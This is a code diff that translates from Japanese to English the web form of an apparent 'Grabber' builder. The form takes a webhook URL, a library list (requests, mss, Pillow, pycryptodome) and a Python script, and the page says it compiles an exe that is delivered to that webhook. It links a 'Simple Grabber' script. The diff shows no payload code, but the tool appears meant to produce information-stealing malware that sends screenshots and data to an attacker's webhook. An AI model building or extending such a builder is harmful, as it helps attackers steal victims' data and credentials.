@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ja" data-bs-theme="dark">
+<html lang="en" data-bs-theme="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -27,7 +27,7 @@
             {% elif success %}
             <p class="text-success">{{ success }}</p>
             {% endif %}
-            <p>作成したGrabberのexeは入力したWebhook URLに送信されます</p>
+            <p>The created Grabber will be sent to the Webhook URL entered.</p>
             <div class="row">
                 <div class="col-md-6">
                     <form method="post" class="mb-3" id="form" accept-charset="UTF-8">
@@ -36,16 +36,16 @@
                             <input type="text" class="form-control" id="webhookUrl" name="webhookUrl" required>
                         </div>
                         <div class="mb-2">
-                            <label for="libraries">使用ライブラリリスト（カンマ区切り）</label>
+                            <label for="libraries">List of libraries used (comma separated)</label>
                             <input type="text" class="form-control" id="libraries" name="libraries" value="requests,mss,Pillow,pycryptodome" required>
                         </div>
                         <div class="mb-2">
-                            <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLの定数名はWEBHOOK_URLです）<a href="https://gist.github.com/stsaria/d8315583d76f2b70ce132c106f61e852">シンプルなGrabber</a>:</label>
+                            <label for="script">Python script (changes are for developers) (constant name for WebhookURL is "WEBHOOK_URL")<a href="https://gist.github.com/stsaria/d8315583d76f2b70ce132c106f61e852">Simple Grabber</a>:</label>
                             <textarea class="form-control" id="script" name="script" rows="20"></textarea>
                         </div>
                         <button type="submit" id="submit" class="btn btn-primary">
                             <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
-                            作成
+                            Generate
                         </button>
                     </form>
                 </div>
